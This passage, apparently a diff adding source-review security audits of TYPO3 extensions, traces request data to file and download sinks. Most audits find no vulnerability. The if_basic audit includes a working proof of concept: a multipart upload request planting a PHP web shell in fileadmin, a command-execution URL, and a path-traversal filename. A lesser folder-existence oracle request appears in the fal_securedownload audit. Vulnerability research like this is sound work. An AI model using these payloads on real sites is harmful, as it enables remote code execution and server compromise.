@@ -165,6 +165,209 @@ No concrete pre-auth exploitable vulnerability (SQLi, XSS, object injection, pat
 
 No actionable pre-auth source→sink vulnerability identified in the audited scope for this version.
 
+### beechit_default-upload-folder
+
+#### Security Audit — beechit/default_upload_folder
+
+- Extension key: `default_upload_folder`
+- Version: 3.0.0 (`ext_emconf.php`)
+- Platform: TYPO3 v12.4 / v13.4
+- Scope: path traversal / folder escape in the computed upload path from request
+  data, injection
+
+## Summary
+
+No concrete vulnerability found, and no pre-auth surface exists. The extension is a
+**backend-only** event listener (`AfterDefaultUploadFolderWasResolvedEvent`) that
+runs inside an authenticated TYPO3 backend user session. The computed sub-folder is
+sourced entirely from **Page TSconfig and User TSconfig** (integrator/admin-
+controlled), never from HTTP request parameters. Folder resolution and creation go
+through FAL (`ResourceFactory`, `ExtendedFileUtility`), which normalise paths and
+enforce storage/filemount permissions.
+
+## Entry point / data flow
+
+- Entry: `DefaultUploadFolder::__invoke(AfterDefaultUploadFolderWasResolvedEvent)`
+  (`Classes/EventListener/Backend/DefaultUploadFolder.php:26`). This event fires
+  during backend file-upload/FormEngine handling — it requires an authenticated
+  `$GLOBALS['BE_USER']` (used directly at `:34`). **Not reachable pre-auth.**
+- Path source: `$subFolder` is read from
+  `BackendUtility::getPagesTSconfig($pid)` and `$GLOBALS['BE_USER']->getTsConfig()`
+  under the `default_upload_folders.` key
+  (`:33-45`, `getDefaultUploadFolderForTableAndField/ForTable/ForAllTables`,
+  `:127-194`). `$table`/`$field`/`$pid` come from the event, and are only used as
+  **array keys** to look up an admin-defined TSconfig value — they are not
+  concatenated into the path.
+
+## Findings (attack classes disproven)
+
+### 1. Folder escape / path traversal from request data — NOT VULNERABLE
+- SEVERITY: n/a  PRE-AUTH: no (backend, authenticated)
+- The upload path string is not built from request input. It is a TSconfig value.
+  The only request-influenced values (`$table`, `$field`, `$pid`) select *which*
+  TSconfig entry applies; they never become path segments. To place a traversal
+  string one must already be able to write Page/User TSconfig, which is an
+  admin/integrator privilege.
+- Sinks are FAL-mediated and permission-checked:
+  `ResourceFactory::getFolderObjectFromCombinedIdentifier($subFolder)`
+  (`:51`, `:113`) which catches `InsufficientFolderAccessPermissionsException`
+  (`:56` → returns null), and folder creation via
+  `ExtendedFileUtility` with `setActionPermissions()` (`:109-111`), which enforces
+  the BE user's filemount/storage permissions. The subfolder-append branch
+  `$uploadFolder->getSubfolder($subFolder)` (`:61-63`) operates on a resolved FAL
+  `Folder`, whose driver normalises `..` and confines access within the storage.
+
+### 2. Injection (date-format placeholder replacement) — NOT VULNERABLE
+- `checkAndConvertForDateFormat()` (`:203-224`) only performs a fixed
+  `str_replace` of `{Y}{y}{m}{n}{j}{d}{W}{w}` with `date()` output on an
+  admin-supplied TSconfig string. No `eval`, no shell, no dynamic key from request.
+
+## Cross-reference
+
+No public TYPO3-EXT-SA is known for this widely-used extension at v3.0.0 for the
+reviewed listener. Assessment from source review.
+
+## Conclusion
+
+Not exploitable: backend-authenticated context, upload path derived from
+admin-controlled TSconfig (not request data), and all filesystem operations routed
+through permission-enforcing FAL APIs. No path traversal or injection.
+
+### beechit_fal-securedownload
+
+#### Security Audit — beechit/fal_securedownload v6.0.3
+
+**Target:** `/home/user/sources/code/typo3-extensions/beechit_fal-securedownload` (v6.0.3, `typo3/cms-core: ^13.4`, PHP ^8.2)
+**Scope:** pre-auth arbitrary file read via the secure-download / dump path and the `FalSecuredownloadFileTreeState` eID — access-control bypass, path traversal, forgeable token.
+**Date:** 2026-08-04
+
+## Summary / Verdict
+
+**No pre-auth arbitrary file read found in v6.0.3.** The three target hypotheses were traced request-parameter → sink and **disproven**:
+
+1. **Access-control bypass — NOT FOUND.** The FE download flow delegates to TYPO3 core's `FileDumpController` (core eID `dumpFile`), which dispatches `ModifyFileDumpEvent`. This extension's `ModifyFileDumpEventListener` runs on that event **on every dump** and enforces FE-group access via `CheckPermissions` before the file is streamed; on denial it hard-`exit`s (401/403). An anonymous request resolves to `userFeGroups = false`, and `matchFeGroupsWithFeUser()` denies any folder/file that carries a non-empty `fe_groups` restriction. The listener is unconditionally registered (`Services.yaml`), so there is no code path that streams a protected file without the check.
+
+2. **Path traversal — NOT FOUND.** Every file-serve sink dereferences an **integer file UID**, never an attacker-supplied path. `DownloadLinkViewHelper`/core pass `f=<uid>` / `p=<uid>`; the sinks are `ResourceStorage::streamFile($file)` and `$file->getForLocalProcessing()` where `$file` came from `ResourceFactory::getFileObject((int)$uid)` / `ProcessedFileRepository::findByUid()`. No `readfile`/`PATH_site.$x`/`getFileAbsFileName()` on request input; the FAL driver confines identifiers to the storage root. No `../` reaches a filesystem read.
+
+3. **Forgeable / predictable token — NOT FOUND.** FE token = `HashService::hmac('dumpFile|<t>|<uid>', 'resourceStorageDumpFile')`; BE token = `HashService::hmac(..., 'BeResourceStorageDumpFile')`. `HashService` keys the HMAC with the site `encryptionKey`. Not forgeable/predictable without server secret. Core rejects a bad `token` with 403 before dispatching the dump event.
+
+The extension is current (TYPO3 v13) and actively maintained, not the vulnerable legacy `dumpFile`-in-extension design of the 1.x/2.x line. No TYPO3 security advisory is published specifically for this extension.
+
+## Full request→sink map (all file-serve routes gated)
+
+| Route | Auth/token gate | Access check | Sink |
+|---|---|---|---|
+| FE `?eID=dumpFile&t=f&f=<uid>&token=<hmac>` | core `FileDumpController` validates `token` (encryptionKey HMAC) | `ModifyFileDumpEventListener::checkFileAccess` → `CheckPermissions::checkFileAccess` (folder rootline + file `fe_groups`) | `ResourceStorage::streamFile` / `getForLocalProcessing` (`ModifyFileDumpEventListener.php:187,208`) |
+| BE ajax `ajax_dump_file` (`/typo3/…/fal_securedownloads/dump_file`) | Backend route ⇒ requires BE session **and** `fal_token` HMAC (`BeResourceStorageDumpFile`) | `getStorage()->checkFileActionPermission('read', $orgFile)` (`BePublicUrlController.php:86`) | `streamFile` (`BePublicUrlController.php:92`) |
+| FE `?eID=FalSecuredownloadFileTreeState` | `EidFrontendAuthentication` middleware sets FE-user aspect | (none — non-file action) | session write only, no file bytes returned |
+
+## Findings (concrete, lower severity — not pre-auth file read)
+
+### F1 — Unauthenticated folder-existence oracle + arbitrary session-key write via `FalSecuredownloadFileTreeState` eID
+- **SEVERITY:** Low. **PRE-AUTH:** Yes (anonymous session).
+- **Source:** `folder` request param → `FileTreeStateController::saveLeafState` (`Classes/Controller/FileTreeStateController.php:62-69`).
+- **Sink:** `LeafStateService::saveLeafStateForUser` → `ResourceFactory::getFolderObjectFromCombinedIdentifier($folder)` (`Classes/Service/LeafStateService.php:49`), then writes `$folderState[$folder]=true` into the FE user/session store (`:93`).
+- **Tainted path:** fully attacker-controlled combined identifier `<storage>:<path>`, no permission check.
+- **Exploitability:** Does **not** return file contents. A valid vs. invalid folder yields different responses (existing folder → `{}`/200 and a session entry; non-existent → `FolderDoesNotExistException`/500, or 404 on empty), giving a folder-existence oracle across all storages. Also lets an anonymous visitor write arbitrary keys/growth into their own session record. No cross-user impact, no file disclosure.
+- **PoC:** `GET /index.php?eID=FalSecuredownloadFileTreeState&folder=1:/secret/&open=1` vs `folder=1:/does-not-exist/` and compare status/exception.
+
+### F2 — `unserialize()` of session-stored leaf state
+- **SEVERITY:** Informational. **PRE-AUTH:** No practical attacker channel.
+- **Location:** `LeafStateService::getFolderState` — `unserialize($folderStates)` (`Classes/Service/LeafStateService.php:81`) without `['allowed_classes' => false]`.
+- **Analysis:** The value is written only by `saveFolderState` (`serialize(array)`) into the server-side FE session store; the client cannot inject raw bytes there. Not exploitable as object injection under normal TYPO3 session handling. Flagged only for hardening (mirror the `allowed_classes => false` used in `EidFrontendAuthentication::unpackUc`).
+
+### F3 — Substring group match in `matchFeGroupsWithFeUser`
+- **SEVERITY:** Informational. **PRE-AUTH:** No (requires login).
+- **Location:** `CheckPermissions::matchFeGroupsWithFeUser` — `if (str_contains($groups, '-2')) return true;` (`Classes/Security/CheckPermissions.php:311`).
+- **Analysis:** Intended to grant "any logged-in user" when the special group `-2` is present. `str_contains` is a loose substring test, but stored `fe_groups` CSVs only ever hold positive fe_group UIDs plus the sentinel `-2`, so no real UID string contains `-2`. Reached only after the `$userFeGroups === false` (not-logged-in) early return, so it cannot help an anonymous request. Not exploitable; noted for correctness (prefer exact CSV membership).
+
+## Known CVEs / Advisories
+- No TYPO3 security advisory is published for `beechit/fal_securedownload` itself (checked typo3.org security advisories / Packagist).
+- Related **core** FAL advisories affect the fallback storage, not this extension's gate: **TYPO3-CORE-SA-2026-013** (Broken Access Control, Media Module fallback storage) and **CVE-2024-25121 / GHSA-rj3x-wvc6-5j66** (FAL entities persisted via DataHandler referencing fallback storage). These are core-side; v6.0.3's own dump path is unaffected and correctly delegates to core `FileDumpController`.
+
+## Conclusion
+The download/dump path and the `FalSecuredownloadFileTreeState` eID were traced end-to-end. Access control is enforced on every file-serving sink, file identity is by integer UID (no traversal), and tokens are encryptionKey-keyed HMACs (not forgeable). **No unpatched pre-auth arbitrary file read exists in v6.0.3.** Only the low/informational items F1–F3 above are concrete.
+
+### brezo-it_multi-file-upload
+
+#### Security Audit — brezo-it/multi_file_upload
+
+- Extension key: `multi_file_upload`
+- Version: 1.2.0 (`ext_emconf.php`)
+- Platform: TYPO3 v13.4 / v14, `typo3/cms-form` (Form Framework element/finisher package)
+- Scope: unrestricted upload / RCE, path traversal in target filename/dir, missing auth on upload endpoint
+
+## Summary
+
+No concrete pre-auth vulnerability found. The extension is a thin layer on top of
+the TYPO3 Form Framework: it adds a `MultiFileUpload` form element, two custom
+`TypeConverter`s that delegate the actual file persistence to the **core**
+`TYPO3\CMS\Form\Mvc\Property\TypeConverter\UploadedFileReferenceConverter`, plus a
+mail/attach finisher. All file-writing, filename sanitisation and extension
+deny-listing remain in core code; the extension introduces no independent file
+sink, no eID/AJAX endpoint, and no request-controlled upload path.
+
+## Entry point / data flow
+
+- Entry: standard Form Framework submission (frontend, may be anonymous by design).
+  There is **no eID or AJAX route** — `ext_localconf.php` only registers the
+  `ext/form` `afterBuildingFinished` / `afterFormStateInitialized` hooks and YAML.
+- Sink (upload): `MultiUploadedFileReferenceConverter::convertFiles()`
+  (`Classes/Mvc/Property/TypeConverter/MultiUploadedFileReferenceConverter.php:49-68`)
+  iterates the uploaded-files array and calls
+  `GeneralUtility::makeInstance(UploadedFileReferenceConverter::class)->convertFrom($item, FileReference::class, ...)`.
+  The write, unique-name generation and the `fileDenyPattern` enforcement all
+  happen inside that core converter → core `ResourceStorage::addUploadedFile()`.
+
+## Findings (attack classes disproven)
+
+### 1. Unrestricted upload / .php → RCE — NOT VULNERABLE
+- PRE-AUTH: form can be public, but no bypass exists.
+- The extension never chooses/writes a filename itself. Persistence is delegated to
+  core `UploadedFileReferenceConverter` (`MultiUploadedFileReferenceConverter.php:61`,
+  `SingleUploadedFileReferenceConverter.php:43/50`), which routes through
+  `ResourceStorage`, applying `$GLOBALS['TYPO3_CONF_VARS']['BE']['fileDenyPattern']`
+  (blocks `php`, `phtml`, `.htaccess`, etc.) plus `sanitizeFileName()`. Optional
+  per-form `allowedMimeTypes` validators are configured by the form editor and run
+  in addition. No executable-extension bypass is introduced here.
+
+### 2. Path traversal in upload folder / filename — NOT VULNERABLE
+- Upload folder is the form-element property `saveToFileMount`
+  (`MultiFilePropertyMappingConfiguration.php:52`), set by a backend form author, and
+  is validated before use by `checkSaveFileMountAccess()`
+  (`MultiFilePropertyMappingConfiguration.php:121-139`): it rejects extension paths
+  (`PathUtility::isExtensionPath`) and requires a resolvable FAL combined identifier
+  (`getFolderObjectFromCombinedIdentifier`). The `uploadSeed` is the form **session
+  identifier** (`:91-115`), not attacker input. No request parameter reaches the
+  folder path; the target filename is generated by core, not by the request.
+
+### 3. Missing auth on an upload endpoint — NOT APPLICABLE
+- There is no custom endpoint. Submission goes through the Form Framework runtime
+  (CSRF/HMAC-protected form state). `MultiUploadedResourceViewHelper` protects
+  re-submitted resource pointers with an HMAC
+  (`HashService::appendHmac(..., HashScope::ResourcePointer->prefix())`,
+  `MultiUploadedResourceViewHelper.php:88`), so an attacker cannot forge a
+  `submittedFile.resourcePointer` to attach an arbitrary existing sys_file.
+
+### 4. IDOR file deletion via `<property>__delete[uid]` — NOT VULNERABLE
+- `MultiUploadedFileReferenceConverter::applyDeletions()` and
+  `UploadDeleteRequest::getMarkedFileUids()` only `detach()` a FileReference from the
+  in-memory `MultiFile` storage (form value); nothing is `unlink`ed from disk
+  (`MultiUploadedFileReferenceConverter.php:104-125`, `UploadDeleteRequest.php`).
+  The deletion set is filtered to UIDs already present in the current form value
+  (`:114-120`), so a foreign UID has no effect. No `unlink`/`delete()` sink exists.
+
+## Cross-reference
+
+No public TYPO3 security advisory (TYPO3-EXT-SA) is known for this extension/version
+for the reviewed classes. Assessment is based on source review of v1.2.0.
+
+## Conclusion
+
+No path traversal, unrestricted upload, or missing-auth vulnerability. Security
+depends on unchanged TYPO3 core file-upload controls (fileDenyPattern, FAL
+permissions, Form Framework HMAC), which this extension correctly reuses.
+
 ### cundd_rest
 
 #### Security Audit — `cundd/rest` (TYPO3 REST API extension)
@@ -330,6 +533,91 @@ No CVE or TYPO3 security advisory (TYPO3-EXT-SA) is known to correspond to `cund
 than by a patched code vulnerability; the audit found no missing upstream security fix
 applicable to this version. (Cross-reference could not be completed against upstream git —
 the target directory is not a git checkout.)
+
+### cylancer_download_library
+
+#### Security Audit — cylancer/cy_download_library
+
+- Extension key: `cydownloadlibrary`
+- Version: 3.1.0 (`ext_emconf.php`)
+- Platform: TYPO3 v13.4, Extbase frontend plugin `DocumentBoard`
+- Scope: path traversal / arbitrary file read, access-control bypass on protected
+  downloads, predictable download tokens
+
+## Summary
+
+No concrete path-traversal / arbitrary-file-read or token vulnerability found.
+Downloads are rendered as ordinary public FAL links (`<f:link.file>`); the extension
+has **no readfile/dumpFile sink, no file-id/path download action, and no download
+tokens** — so the traversal and token classes do not apply. Write/delete actions are
+gated by an owner check. The one noteworthy issue is a **design-level access
+exposure**: the document listing and its file links are shown to every visitor
+without any frontend-user-group restriction, so if `documentsFolder` is a public
+storage the files are effectively unauthenticated downloads — but this is inherent to
+storing in a public FAL storage, not a code traversal bug.
+
+## Entry points
+
+`ext_localconf.php` registers plugin `DocumentBoard` with actions
+`show, upload, removeDocument, archiveDocument` (all non-cacheable). No eID/AJAX.
+
+## Findings
+
+### 1. Path traversal / arbitrary file read via file id or path — NOT VULNERABLE
+- SEVERITY: n/a  PRE-AUTH: n/a
+- There is no download controller action and no filesystem read sink. The template
+  serves files with
+  `<f:link.file file="{document.file.originalResource.originalFile}">`
+  (`Resources/Private/Templates/DocumentBoard/Show.html:42,187`), i.e. a FAL
+  public-URL link. No request parameter is used to look up a file by path/id for
+  reading. `grep` for `readfile|dumpFile|file_get_contents|fopen|getContents` in
+  `Classes/` returns nothing relevant. Traversal class disproven.
+
+### 2. Access-control bypass on protected downloads — DESIGN EXPOSURE (not a code bug)
+- SEVERITY: Low/Informational  PRE-AUTH: yes (viewing), by design
+- `showAction()` assigns `documentRepository->getSortedDocuments()`
+  (`DocumentBoardController.php:72-76`), and `getSortedDocuments()`
+  (`DocumentRepository.php:19-43`) returns **all** documents with no
+  frontend-user-group filtering. The template renders public FAL file links for
+  every document to every visitor. Only the *add* form is gated (`canAddDocuments`,
+  `:79-84`) and *remove/archive* buttons are shown only to the owner
+  (`Show.html:78,94`). Consequence: if the configured `documentsFolder` lives in a
+  public storage (e.g. `fileadmin`), documents are downloadable by anonymous users.
+  This is a configuration/design property of storing files in a public FAL storage,
+  not a traversal or broken-token flaw; no per-document ACL is claimed by the code.
+
+### 3. Predictable download tokens — NOT APPLICABLE
+- No token scheme exists; downloads are direct FAL URLs. Nothing to predict/forge.
+
+### 4. Owner-check on removeDocument / archiveDocument — ADEQUATE (no IDOR)
+- `removeDocumentAction(Document $document)` (`:88`) and `archiveDocumentAction`
+  (`:121`) both call `validateRemove()/validateArchive()` which enforce
+  `frontendUserService->getCurrentUserUid() !== $document->getOwner()->getUid()`
+  (`:114`, `:143`). A non-owner (or anonymous, where `getCurrentUserUid()` returns
+  falsy) fails the check and no mutation occurs. The deleted file UID comes from the
+  DB-loaded `$document->getFile()->getUid()` (`:95`), not from raw request input;
+  overriding the `file` relation via extra POST keys is blocked by Extbase trusted-
+  properties (the remove form exposes only `__identity`). No arbitrary-file delete.
+- Minor code smell: `FrontendUserService::getCurrentUserUid(): int` returns `false`
+  when not logged in (`FrontendUserService.php:45-51`) — type-inconsistent but fails
+  safe for the comparisons above.
+
+### 5. Upload — restricted, no RCE
+- `initializeUploadAction()` attaches a `MimeTypeValidator` limited to
+  pdf/jpeg/png/txt/odt/ods/odp (`:41-49,153-172`), max 1 file, folder =
+  `settings['documentsFolder']` (TypoScript, not request), `DuplicationBehavior::RENAME`.
+  Combined with core `fileDenyPattern`, no `.php` upload / RCE path.
+
+## Cross-reference
+
+No public TYPO3-EXT-SA known for this extension/version. Assessment from source
+review of v3.1.0.
+
+## Conclusion
+
+No path-traversal, arbitrary-file-read, or token vulnerability. The only actionable
+recommendation is authorization/design: restrict the document listing and its file
+storage to the intended frontend user group if downloads are meant to be protected.
 
 ### derhansen_sf_event_mgt
 
@@ -996,6 +1284,190 @@ Powermail is distributed via the TYPO3 Extension Repository; its security issues
 
 > Note: precise CVE identifiers for the older powermail advisories are not asserted here to avoid fabricating IDs; they are tracked under the vendor's TYPO3-EXT-SA advisory series. Confirm exact IDs against the TYPO3 security advisory index for the affected 2.x–7.x versions if a CVE mapping is required for reporting.
 
+### innologi_typo3-decosdata
+
+#### Security Audit — innologi/typo3-decosdata (decosdata) v3.0.1
+
+**Target eID:** `tx_decosdata_download` (download handler)
+**TYPO3 constraint:** 13.4.0–13.4.99 / PHP 8.2–8.4
+**Focus:** path traversal / arbitrary file read, access-control bypass
+**Verdict:** No exploitable pre-auth vulnerability found. The download handler is correctly protected by an HMAC bound to the site `encryptionKey` and dereferences a FAL file **uid**, not a filesystem path.
+
+---
+
+## Summary
+
+The eID `tx_decosdata_download` is registered pre-auth in `ext_localconf.php`:
+
+```
+$GLOBALS['TYPO3_CONF_VARS']['FE']['eID_include']['tx_decosdata_download'] = \Innologi\Decosdata\Eid\Download::class;
+```
+
+`Eid/Download::run()` delegates to `DownloadService::validateRequest()->sendFile(true)`. The candidate sinks (`filesize`, `fopen`, `readfile`, `readfileByChunks`) all operate on a path derived from `ResourceFactory->getFileObject($this->fileUid)` — a **FAL sys_file uid lookup**, not an attacker-supplied path. Before any file is touched, `validateRequest()` enforces an HMAC over the requested identifiers. The path-traversal / arbitrary-read hunt is therefore disproven, and the access-control angle is closed by the HMAC + encryptionKey.
+
+---
+
+## Analysis of the traced path
+
+**Source** — `Classes/Service/DownloadService.php:validateRequest()` (approx. lines 150–170):
+
+```php
+$this->fileUid = (int) $_GET['f'] ?? null;   // int cast
+$blobUid       = (int) $_GET['b'] ?? null;
+$itemUid       = (int) $_GET['i'] ?? null;
+$hash          = (string) $_GET['h'] ?? '';
+
+$this->validRequest = $this->getHashService()->validateHmac(
+    $this->generateHashString($this->fileUid, $blobUid, $itemUid),  // "f-b-i|salt"
+    $this->secretSalt,
+    $hash,
+);
+if (!$this->validRequest) {
+    throw new \Exception('Invalid request', 1515670080);
+}
+```
+
+**Sink** — `Classes/Service/DownloadService.php:sendFile()` (approx. lines 180–200):
+
+```php
+if (!$this->validRequest) { throw new \Exception('The request was not validated', 1515683722); }
+$file     = $this->getResourceFactory()->getFileObject($this->fileUid);        // FAL uid → File
+$filepath = \TYPO3\CMS\Core\Core\Environment::getPublicPath() . '/' . $file->getPublicUrl();
+$filesize = filesize($filepath);
+...
+readfile($filepath); // (or chunked)
+```
+
+### Why path traversal / arbitrary file read does NOT apply
+- `f` is `(int)`-cast, so `$this->fileUid` is always an integer. It is never concatenated into a path.
+- The read path is computed from `getFileObject($uid)->getPublicUrl()`, i.e. a FAL-indexed file record. There is no attacker-controlled string component reaching `fopen`/`readfile`. `../`, absolute paths, null bytes, PHP wrappers, etc. cannot be injected because the input is numeric and dereferenced through FAL.
+
+### Why the HMAC is not forgeable pre-auth (access-control)
+- `generateHashString()` concatenates the uids with the hardcoded `$salt`, and the HMAC is produced via `\TYPO3\CMS\Core\Crypto\HashService::hmac($message, $this->secretSalt)`.
+- In TYPO3 v13 the Core `HashService` derives the MAC from the site-wide **`$GLOBALS['TYPO3_CONF_VARS']['SYS']['encryptionKey']`** in addition to the supplied `additionalSecret`. The two hardcoded constants (`$salt`, `$secretSalt`) are public (GPL source), but the encryptionKey is a per-installation secret. Without it an attacker cannot compute a valid `h` for an arbitrary `f`, so they cannot request an arbitrary FAL uid.
+- `validateHmac` uses constant-time comparison; no type-juggling bypass (the empty-string default still fails the compare).
+
+### Residual notes (not vulnerabilities)
+- The HMAC binds only `(f,b,i)` — it carries no per-user/session binding. This is by design: a generated download URL is a bearer capability for a specific file and works for any (including anonymous) client. It does not let an attacker reach files they weren't already handed a link for, so it is not a privilege-escalation IDOR.
+- If a site operator ships an empty/weak/leaked `encryptionKey`, the HMAC would become forgeable — but that is a deployment misconfiguration of the whole TYPO3 instance, not a bug in this extension.
+
+---
+
+## PoC
+
+Not exploitable. A request such as `GET /index.php?eID=tx_decosdata_download&f=1&b=0&i=0&h=<forged>` is rejected with `Invalid request (1515670080)` unless `h` is a valid HMAC produced with the target site's encryptionKey. A legitimately issued link (`h` generated by `getDownloadUrl()`) only yields the exact `f` it was signed for.
+
+## Known CVEs / advisories
+No dedicated public advisory (TYPO3-EXT-SA / GHSA / CVE) was found for `decosdata` / `innologi/typo3-decosdata` at v3.0.1. Related TYPO3 core file-upload advisories (e.g. TYPO3-CORE-SA-2025-014) concern the core FAL, not this extension. Nothing applicable to this eID.
+
+**Sources:** [TYPO3 Security Advisories](https://typo3.org/help/security-advisories), [TYPO3-CORE-SA-2025-014](https://typo3.org/security/advisory/typo3-core-sa-2025-014)
+
+### interfrog_if_basic
+
+#### Security Audit — interfrog/if_basic (ifPage Basic) v2.0.0
+
+**Target eID:** `ajaxupload` (AJAX upload handler)
+**TYPO3 era:** 8.7 (deps: fluid_styled_content/rte_ckeditor 8.7, powermail 3.8–3.21)
+**Focus:** unrestricted file upload → RCE, path traversal, missing auth
+**Verdict:** CRITICAL — confirmed **pre-auth unrestricted file upload leading to remote code execution**. An unauthenticated attacker can upload a `.php` file into a web-reachable directory (`fileadmin/user_upload/`) and execute it.
+
+---
+
+## Summary
+
+`ext_localconf.php:15` registers the eID with no authentication and points it at a raw PHP script:
+
+```php
+$GLOBALS['TYPO3_CONF_VARS']['FE']['eID_include']['ajaxupload'] =
+    'EXT:'.$_EXTKEY.'/Classes/Utility/AjaxUploadEid.php';
+```
+
+The handler (`Classes/Utility/AjaxUploadEid.php`, class `AjaxUploadController::init()`) takes `$_FILES['SelectedFile']`, "validates" it against a **client-supplied MIME type**, then writes it to `fileadmin/user_upload/<date>-<original-name>` using `move_uploaded_file()`. The extension/type of the original filename is preserved verbatim, the content-type check trusts attacker-controlled data, and the image-content check is commented out. `fileadmin/` is served directly by the web server in a default TYPO3 install, so an uploaded `.php` file is directly executable.
+
+---
+
+## Finding 1 — Unrestricted file upload → RCE (CRITICAL, PRE-AUTH)
+
+**Severity:** Critical
+**Pre-auth:** Yes — eID handlers run before any FE/BE authentication; no login, CSRF token, or referer check exists anywhere in the flow.
+
+**Source** — `Classes/Utility/AjaxUploadEid.php`, `init()`:
+```php
+$this->uploadedFile = $_FILES['SelectedFile'];      // fully attacker-controlled multipart upload
+$this->validateFile();
+...
+$newFile = $this->targetFolder . date('Y-m-d--H-i-s') . '-' . $this->uploadedFile['name'];
+if (!move_uploaded_file($this->uploadedFile['tmp_name'], $newFile)) { ... }   // SINK
+```
+
+**Broken validation** — `validateFile()`:
+```php
+// if(!getimagesize($this->uploadedFile['tmp_name'])){ ... }   // <-- commented out, disabled
+if(!in_array($this->uploadedFile['type'], $this->allowedMimeTypes)) {   // 'type' = client-sent Content-Type
+    array_push($this->errors,'Unsupported filetype uploaded.');
+}
+if($this->uploadedFile['size'] > $this->allowedFileSize){ ... }
+```
+
+**Tainted path:**
+`$_FILES['SelectedFile']['type']` and `['name']` (both set by the client in the multipart body)
+→ `validateFile()` only compares `['type']` against `['image/png','image/jpeg','image/gif']`
+→ the sole real content check (`getimagesize`) is commented out
+→ `['name']` (extension intact) is appended to `targetFolder` and passed to `move_uploaded_file()`
+→ file lands at `fileadmin/user_upload/<timestamp>-evil.php`, which the web server executes on request.
+
+**Why it is exploitable:**
+- `$_FILES[...]['type']` is the browser/attacker-declared MIME string, not derived from content. Sending `Content-Type: image/png` for the `SelectedFile` part passes the whitelist while the actual bytes are PHP.
+- The filename extension is never checked or normalized; `date('Y-m-d--H-i-s') . '-' . name` keeps `evil.php` as `.php`.
+- `targetFolder` defaults to `fileadmin/user_upload/` (web-reachable). It can only be overridden by TypoScript (`plugin.tx_powermail.settings.setup.ajaxUpload.targetFolder`), not by the attacker — and the default is already exploitable.
+- No auth gate: eID is dispatched by TYPO3's frontend before authentication; anyone on the network can call it.
+
+**PoC request:**
+```
+POST /index.php?eID=ajaxupload HTTP/1.1
+Host: victim
+Content-Type: multipart/form-data; boundary=X
+
+--X
+Content-Disposition: form-data; name="SelectedFile"; filename="shell.php"
+Content-Type: image/png
+
+<?php system($_GET['c']); ?>
+--X--
+```
+Response: `{"status":"done","fileName":"fileadmin/user_upload/2026-08-04--12-00-00-shell.php"}`
+Then: `GET /fileadmin/user_upload/2026-08-04--12-00-00-shell.php?c=id` → command execution.
+(The timestamp prefix is returned in the JSON `fileName`, so the exact URL is known to the attacker; even if it weren't, it is second-granularity and trivially brute-forced.)
+
+---
+
+## Finding 2 — Path traversal in target path (HIGH, PRE-AUTH)
+
+**Severity:** High (secondary; subsumed by Finding 1 for impact)
+**Pre-auth:** Yes.
+
+`$this->uploadedFile['name']` is concatenated into the destination with no `basename()`/sanitization:
+```php
+$newFile = $this->targetFolder . date('Y-m-d--H-i-s') . '-' . $this->uploadedFile['name'];
+move_uploaded_file($this->uploadedFile['tmp_name'], $newFile);
+```
+A multipart `filename` containing a path separator (e.g. `x/../../../typo3conf/evil.php`) resolves to `fileadmin/user_upload/<ts>-x/../../../typo3conf/evil.php`, letting the attacker escape `user_upload/` and write elsewhere in the docroot (subject to directory existence / write permissions). This widens where the RCE payload can be planted. Note the date prefix defeats a bare leading `../` (the segment becomes `<ts>-..`), but a name of the form `dir/../../...` traverses normally because the `/` splits the prefix from the `..` segments.
+
+---
+
+## Finding 3 — Missing authentication / unauthenticated PID injection (INFO)
+
+`initTSSettings()` takes `$_GET['id']` unsanitized as the page id used to bootstrap `TypoScriptFrontendController` and `EidUtility::initFeUser()`. This confirms the endpoint runs with no auth and lets an attacker choose which page's TypoScript is loaded (thereby influencing `allowedMimeTypes`/`allowedFileSize`/`targetFolder` if any page in the tree defines weaker values). Lower impact than Findings 1–2 but reinforces that the whole handler is unauthenticated.
+
+---
+
+## Known CVEs / advisories
+No dedicated public advisory (TYPO3-EXT-SA / GHSA / CVE) was found for `if_basic` / `interfrog/if_basic` v2.0.0. The pattern matches the class of "Unrestricted File Upload" issues TYPO3 tracks in core (e.g. TYPO3-CORE-SA-2021-002, TYPO3-CORE-SA-2025-014), but this is an extension-specific, unreported bug. Recommend responsible disclosure to the vendor (info@interfrog.de) and immediate mitigation.
+
+**Remediation:** enforce a server-side extension allowlist (reject anything but real image extensions), validate real content with `getimagesize()`/finfo, `basename()` the filename, drop the trust in `$_FILES[...]['type']`, and add an authentication/CSRF check to the eID.
+
+**Sources:** [TYPO3-CORE-SA-2021-002 (Unrestricted File Upload in Form Framework)](https://typo3.org/security/advisory/typo3-core-sa-2021-002), [TYPO3-CORE-SA-2025-014 (Unrestricted File Upload in FAL)](https://typo3.org/security/advisory/typo3-core-sa-2025-014), [CVE-2025-47939 advisory](https://github.com/advisories/GHSA-9hq9-cr36-4wpj)
+
 ### jweiland_events2
 
 #### Security Audit — jweiland/events2
@@ -1074,6 +1546,86 @@ Powermail is distributed via the TYPO3 Extension Repository; its security issues
 - No public CVE / TYPO3-EXT-SA advisory is known to affect **events2 10.2.10** (current release for TYPO3 v13.4, 2025).
 - The code shows the defensive patterns that historically hardened this extension: the frontend event-management flow is fully gated behind `RestrictAccessEventListener`, newly created events are force-hidden pending editor activation, and all AJAX/search DB access is parameterized. No regression of those mitigations was found.
 - Recommendation: track the `jweiland-net/events2` GitHub security advisories feed; nothing in this version requires remediation for the pre-auth threat model.
+
+### oliverklee_realty
+
+#### Security Audit — oliverklee/realty (Realty Manager) v3.0.2
+
+**Target eID:** `realty` (AJAX dispatcher)
+**TYPO3 constraint:** 7.6.23–8.7.99 / PHP 5.5–7.2
+**Focus:** SQL injection (legacy raw WHERE), reflected XSS in search, IDOR
+**Verdict:** No exploitable pre-auth vulnerability found via the eID. The dispatcher casts its only attacker input to `(int)`, and the district title output is HTML-encoded. An unsafe raw-concatenation WHERE clause exists downstream but is unreachable with tainted data because of the int cast.
+
+---
+
+## Summary
+
+`ext_localconf.php` registers the eID pre-auth:
+
+```php
+$GLOBALS['TYPO3_CONF_VARS']['FE']['eID_include']['realty'] = 'EXT:realty/Ajax/tx_realty_Ajax_Dispatcher.php';
+```
+
+`Ajax/tx_realty_Ajax_Dispatcher.php` exposes exactly one action — a city→district drop-down:
+
+```php
+$cityUid = (int)\TYPO3\CMS\Core\Utility\GeneralUtility::_GET('city');   // int cast
+$showWithNumbers = (\TYPO3\CMS\Core\Utility\GeneralUtility::_GET('type') === 'withNumber');  // strict bool
+if ($cityUid > 0) {
+    $output = \tx_realty_Ajax_DistrictSelector::render($cityUid, $showWithNumbers);
+}
+```
+
